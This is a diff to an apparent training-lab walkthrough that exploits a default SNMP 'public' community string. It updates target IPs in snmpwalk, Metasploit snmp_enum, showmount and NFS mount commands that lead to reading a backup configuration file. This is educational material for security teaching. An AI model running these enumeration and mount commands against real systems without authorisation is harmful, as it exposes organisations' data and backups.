@@ -8,9 +8,9 @@ Exploitation of the default `public` SNMP community string confirmed in `r-15- s
 
 | Item | Value |
 |---|---|
-| Target | 192.168.144.132 |
+| Target | 192.168.144.200 |
 | Service | Net-SNMP (snmpd) 5.9.3, port 161/udp |
-| Attacker | Kali, 192.168.144.129 |
+| Attacker | Kali VM on the same host-only lab network |
 | Tooling | snmpwalk, Metasploit (`auxiliary/scanner/snmp/snmp_enum`) |
 
 ## Vulnerability
@@ -22,8 +22,8 @@ Exploitation of the default `public` SNMP community string confirmed in `r-15- s
 **On Kali**, retrieving organisational configuration data:
 
 ```bash
-snmpwalk -v2c -c public 192.168.144.132 1.3.6.1.2.1.1.4.0
-snmpwalk -v2c -c public 192.168.144.132 1.3.6.1.2.1.1.6.0
+snmpwalk -v2c -c public 192.168.144.200 1.3.6.1.2.1.1.4.0
+snmpwalk -v2c -c public 192.168.144.200 1.3.6.1.2.1.1.6.0
 ```
 
 Returns the configured `sysContact` and `sysLocation` values:
@@ -38,7 +38,7 @@ This discloses genuine organisational detail (a contact email address and physic
 
 ```
 use auxiliary/scanner/snmp/snmp_enum
-set RHOSTS 192.168.144.132
+set RHOSTS 192.168.144.200
 run
 ```
 
@@ -47,7 +47,7 @@ Retrieves the complete running-process list (see `r-15` for full output), confir
 **On Kali**, retrieving the extended breadcrumb note:
 
 ```bash
-snmpwalk -v2c -c public 192.168.144.132 1.3.6.1.4.1.8072.1.3.2
+snmpwalk -v2c -c public 192.168.144.200 1.3.6.1.4.1.8072.1.3.2
 ```
 
 ```
@@ -59,16 +59,16 @@ This confirms a working `NET-SNMP-EXTEND-MIB` custom OID deliberately configured
 **Using this lead:** the note points directly at `/srv/backups`. A student reaching this breadcrumb via SNMP, whether or not they have already found the equivalent FTP note, can follow it directly without needing to consult another file first:
 
 ```bash
-showmount -e 192.168.144.132
+showmount -e 192.168.144.200
 ```
 ```
-Export list for 192.168.144.132:
+Export list for 192.168.144.200:
 /srv/backups *
 ```
 
 ```bash
 mkdir /tmp/backups_mnt
-sudo mount -t nfs 192.168.144.132:/srv/backups /tmp/backups_mnt
+sudo mount -t nfs 192.168.144.200:/srv/backups /tmp/backups_mnt
 ls -la /tmp/backups_mnt
 cat /tmp/backups_mnt/backup.conf
 ```
